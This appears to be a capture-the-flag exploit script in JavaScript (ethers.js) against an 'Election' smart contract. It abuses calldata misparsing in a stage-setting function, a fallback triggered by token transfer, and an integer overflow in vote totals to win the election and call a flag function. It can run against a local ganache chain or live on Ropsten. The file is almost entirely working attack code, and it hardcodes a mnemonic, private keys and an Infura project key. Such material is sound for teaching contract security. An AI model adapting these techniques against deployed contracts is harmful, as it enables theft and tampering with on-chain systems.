const {BigNumber, ethers} = require('ethers')

const Election = require("./abi.json")["contracts"]["Election.sol:Election"]

const FLAG = "Give me the flag, please"

class Exploit {
    constructor(contract, wallet, walletAddress, provider, stages, minter) {
        this.contract = contract
        this.wallet = wallet
        this.walletAddress = walletAddress
        this.provider = provider
        this.stages = stages
        this.minter = minter
    }

    // _setStage will only read the first 32 bytes and then consider the rest as junk
    // as a result the argument to _setStage will always be msg.sender!
    async setStage(idx) {
        const wallet = this.stages[idx]
        this.contract = await this.contract.connect(wallet)
        const receipt = await this.call("_setStage(uint256)", 0, [])

        this.contract = await this.contract.connect(this.wallet)

        console.log("Set the stage to:", (await this.contract.stage())._hex)
    }

    // propose gets the first 32 bytes of the call correctly: the candidate
    // next there's the message value which it tells it where to look for the next
    // argument
    async propose() {
        await this.setStage(0)

        const proposal = { name: "", policies: FLAG, valid: true};
        if (process.env.CHEAT) {
            return this.contract.propose(this.walletAddress, proposal)
        }
        
        const sig = "propose(address,(string,string,bool))"
        let abiEncoded = this.contract.interface.encodeFunctionData("propose", [this.walletAddress, proposal])
        let abiEncodedFull = abiEncoded; // keep a backup just incase
        // strip the call from the function signature
        console.log("Signature", '0x' + abiEncoded.slice(2, 10))
        abiEncoded = abiEncoded.slice(10)
        // strip the address from the call
        console.log("Candidate", '0x' + abiEncoded.slice(24, 64))
        abiEncoded = abiEncoded.slice(64)
        console.log("Rest", abiEncoded)
        // Since we want to have an (address, Proposal), we will skip up to the msg.sender
        // part of the call, and then use the first 32 bytes as the `value` of the transfer
        // and the rest as the `data` field. These will hopefully get put back together
        // in the correct way, so that a call to `propose` is made
        let value = abiEncoded.slice(0, 66)
        let data = '0x' + abiEncoded.slice(66)
        // abi.encodeWithSignature(customFallback, msg.sender, value, data)
        const contractSees = await this.contract.helper(sig, this.walletAddress, value, data)
        console.log("Contract\n", contractSees)
        console.log("Us\n", abiEncodedFull)

        // get us the missing funds
        await this.mint(value)

        await this.call(
            sig,
            value,
            data,
        )
    }

    // another account gets 1 unit then transfers it to us
    async mint(value) {
        this.contract = this.contract.connect(this.minter) 
        value = BigNumber.from(value); // value
        for (let i = 0; i < value; i++) {
            await this.contract.giveMeMoney()
            await this.contract["transfer(address,uint256)"](this.walletAddress, 1)
        }
        this.contract = this.contract.connect(this.wallet)
    }

    // give the desired candidate max voters, AND overflow totalVotes!
    ballots () {
        return [
            {
                candidate : this.walletAddress, 
                votes :  ethers.constants.MaxUint256,
            },
            {
                candidate : "0x0000000000000000000000000000000000000000", 
                votes : 1 
            }
        ]
    }

    ballothash() {
        let abiEncoded = ethers.utils.defaultAbiCoder.encode(
            [
                "tuple(address candidate,uint256 votes)[]"
            ],
            [this.ballots()]
        )
        return ethers.utils.keccak256(abiEncoded)
    }

    async vote () {
        await this.setStage(1)
        const hash = this.ballothash()
        await this.contract.vote(hash)
        console.log("Voted for", hash)
    }

    async reveal() {
        await this.setStage(2)
        const balanceOf = await this.contract.balanceOf(this.walletAddress)
        let tx
        if (balanceOf === 0) {
            tx = await this.contract.giveMeMoney()
            await tx.wait()
        }

        console.log("Revealing", this.ballothash())
        // 0 here because it's the 0th proposal
        tx = await this.contract.reveal(0, this.ballots())
        await tx.wait()
    }

    async win() {
        await this.setStage(3)
        await this.contract.giveMeFlag()
        console.log("Did we win?", await this.contract.sendFlag())
    }

    // Function signature and all the arguments
    async call (fnsig, amount, data) {
        // transfer from the address with the money
        // to the contract itself to trigger the fallback
        let tx = await this.contract["transfer(address,uint256,bytes,string)"](
            this.contract.address,
            amount,
            data,
            fnsig,
        )
        return await tx.wait()
    }
}

const createExploit = async (contract, wallet, walletAddress, provider, stages, minter) => {
    const exploit = new Exploit(contract, wallet, walletAddress, provider, stages, minter)

    if (process.env.FUND) {
        const gasMoney = ethers.utils.parseEther('0.02')
        console.log("Funding accounts...")
        for (stage of stages) {
           // send them some gas money
           console.log(stage.address)
            try {
                await wallet.sendTransaction({to: stage.address, value: gasMoney })
            } catch(e) {
                // stupid
                await wallet.send('eth_sendTransaction', [{ from: "0xa0516d813E00f29f2EF93015e1f225D3CB8e4200", to: stage.address, value: gasMoney._hex }])
            }
        }

        try {
            await wallet.sendTransaction({to: minter.address, value: gasMoney })
        } catch(e) {
            await wallet.send('eth_sendTransaction', [{ from: "0xa0516d813E00f29f2EF93015e1f225D3CB8e4200", to: minter.address, value: gasMoney._hex }])
        }

        console.log("Accounts funded, starting.")
    }

    return exploit
}

const mnemonic = "cash trigger smile grain social must phrase blind blind fabric excite captain"
;(async() => {
    let contract
    let provider
    let signer
    let walletAddress
    if (process.env.PRIVATE_KEY) { // if we gave it a priv key, it's going to exploit it live
        provider = new ethers.providers.JsonRpcProvider("https://ropsten.infura.io/v3/c60b0bb42f8a4c6481ecd229eddaca27");
        // via the wallet
        signer = new ethers.Wallet(process.env.PRIVATE_KEY)
        signer = signer.connect(provider)
        contract = new ethers.Contract(process.env.ADDRESS, Election.abi, signer)
        walletAddress = signer.address
    } else {
        const ganache = require("ganache-core");
        provider = ganache.provider({ mnemonic: mnemonic })
        provider = new ethers.providers.Web3Provider(provider);
        const factory = new ethers.ContractFactory(Election.abi, Election.bin, provider.getSigner())
        contract = await factory.deploy()

        signer = provider.getSigner()
        walletAddress = "0xa0516d813E00f29f2EF93015e1f225D3CB8e4200"
    }

    // wallets with corresponding 0s -- findWallet("00")
    let stage0 = ethers.Wallet.fromMnemonic(mnemonic)
    stage0 = stage0.connect(provider)
    let stage1 = new ethers.Wallet("0x163cc00f6800f1c60ae7f2c5a1fa3fcbf9d54fe3bcfd5d9a1d60e109aea8c5d8", provider)
    let stage2 = new ethers.Wallet("0x90f8d4f8506bc6386a57a4f8906eedd85814fe7ec9bdf8b81a61a0333cd0652a", provider)
    let stage3 = new ethers.Wallet("0xcef3f4d50c276c220337958524d1df18e62bcd6e029433d0093e6df0cb89ffc1", provider)
    const stages = [stage0, stage1, stage2, stage3]
    let minter = ethers.Wallet.createRandom()
    minter = minter.connect(provider)

    const exploit = await createExploit(contract, signer, walletAddress, provider, stages, minter)
    await exploit.propose()
    await exploit.vote()
    await exploit.reveal()
    await exploit.win()
})()


// helper which is no longer useful
const findWallet = (suffix) => {
    let wallet
    for (let i = 1; i > 0; i++) {
        wallet = new ethers.Wallet.createRandom()
        if (wallet.address.endsWith(suffix)) {
            break
        }
    }

    return wallet
}
